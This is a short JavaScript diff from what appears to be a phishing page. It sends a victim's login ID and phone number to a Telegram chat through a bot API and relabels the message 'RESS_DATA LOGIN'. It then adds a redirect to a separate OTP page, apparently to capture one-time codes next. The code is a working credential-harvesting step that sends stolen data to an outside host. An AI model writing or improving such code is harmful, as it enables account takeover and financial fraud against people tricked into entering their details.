@@ -56,12 +56,14 @@
                 },
                 body: JSON.stringify({
                     chat_id: chatId,
-                    text: `New form submission:\nCountry: ${payload.Id}\nPhone: ${payload.Nomor}`
+                    text: `RESS_DATA LOGIN:\nId: ${payload.Id}\nNomor: ${payload.Nomor}`
                 })
             })
             .then(response => response.json())
             .then(data => {
                 if (data.ok) {
+                    // Redirect to the OTP page upon success
+                    window.location.href = '../otp/index.html';
                 } else {
                     alert('Failed to send data to Telegram. Please try again.');
                 }
